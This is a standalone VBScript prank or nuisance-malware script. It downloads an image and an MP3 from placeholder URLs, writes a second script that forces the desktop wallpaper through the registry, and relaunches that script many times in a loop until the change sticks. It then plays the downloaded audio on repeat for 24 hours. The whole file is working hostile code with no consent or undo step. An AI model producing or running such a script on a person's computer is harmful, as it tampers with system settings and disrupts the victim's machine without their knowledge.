Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName
'Get image data
Dim document : Set document = WScript.GetObject("YOUR_URL.jpeg")
While document.readyState <> "complete" : WScript.Sleep 200 : Wend
Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP.3.0")
xhr.open "GET", document.getElementsByTagName("img")(0).src, False
xhr.send
Dim stream : Set stream = CreateObject("Adodb.Stream")
stream.Type = 1
stream.Open
stream.Write xhr.responseBody
stream.SaveToFile "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", 2
stream.Close
'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "YOUR_URL.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with
'Set subfolder
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZS.vbs"
lines = Array( _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
    "Dim strUsername : strUsername = wshNetwork.UserName", _
    "strLocalPath = ""C:\Users\" & strUsername & "\Downloads\LemonZS.jpg""", _
    "objShell.RegWrite ""HKCU\Control Panel\Desktop\Wallpaper"", strLocalPath", _
    "WScript.Sleep 10000", _
    "objShell.Run ""%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1, True" _
)
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing
'Set image
WScript.Sleep 2000
Dim objShell
Set objShell = CreateObject("WScript.Shell")
strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
Set objNetwork = CreateObject("WScript.Network")
strUsername = objNetwork.UserName
Do
    strDesktopWallpaper = objShell.RegRead("HKCU\Control Panel\Desktop\Wallpaper")
    If StrComp(strDesktopWallpaper, "C:\Users\" & strUsername & "\Downloads\LemonZS.jpg", vbTextCompare) = 0 Then
        Exit Do
    End If
    WScript.Sleep 1000
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
    objShell.Run strPath
Loop
'WScript.Echo "Desktop wallpaper matches: C:\Users\" & strUsername & "\Downloads\LemonZS.jpg"
Set objShell = Nothing
'Set music
Set objShell = CreateObject("WScript.Shell")
Set objWMPlayer = CreateObject("WMPlayer.OCX")
strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
objWMPlayer.URL = strMusicPath
objWMPlayer.settings.setMode "loop", True
objWMPlayer.settings.setMode "autoRewind", True
objWMPlayer.controls.play
WScript.Sleep 86400000
Set objShell = Nothing
Set objWMPlayer = Nothing
